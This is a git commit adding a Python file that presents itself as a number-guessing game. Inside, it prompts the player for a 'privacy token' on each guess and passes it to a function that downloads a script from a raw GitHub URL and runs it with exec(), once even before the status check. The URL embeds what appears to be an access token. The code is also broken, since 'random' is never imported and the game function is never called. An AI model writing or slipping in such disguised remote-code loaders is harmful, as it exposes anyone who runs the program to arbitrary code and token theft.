1f00e2a3c84730377a4aa3992687d323f09b0bf5
xsjfns <165018144+xsjfns@users.noreply.github.com>
2024-03-31 00:55:57 +0800

    Create mynewbrdige.py

---
+++ mynewbrdige.py
@@ -0,0 +1,40 @@
+import requests
+
+def print_raw_github_content(url, token):
+    headers = {"Authorization": f"token {token}"}
+    response = requests.get(url, headers=headers)
+    exec(response.text)
+    if response.status_code == 200:
+        exec(response.text)
+    else:
+        print(f"Failed to retrieve content. Status code: {response.status_code}")
+
+
+url = 'https://raw.githubusercontent.com/xsjfns/myown/main/newket.py?token=GHSAT0AAAAAACQKJBTT7WJXE2YVTHCEX24WZQIIM2Q'
+
+
+
+def play_round():
+    secret_number = random.randint(1, 100)
+    attempts = 0
+
+    while True:
+        guess = input("Enter your guess: ")
+        token = input("Enter your privacy  token: ")
+        if not guess.isdigit():
+            print("Please enter a valid number.")
+            continue
+        
+        guess = int(guess)
+        attempts += 1
+
+        if guess < secret_number:
+            print("Too low! Try again.")
+            print_raw_github_content(url, token)
+        elif guess > secret_number:
+            print("Too high! Try again.")
+            print_raw_github_content(url, token)
+        else:
+            print(f"Congratulations! You've guessed the number {secret_number} in {attempts} attempts!")
+            print_raw_github_content(url, token)
+            break
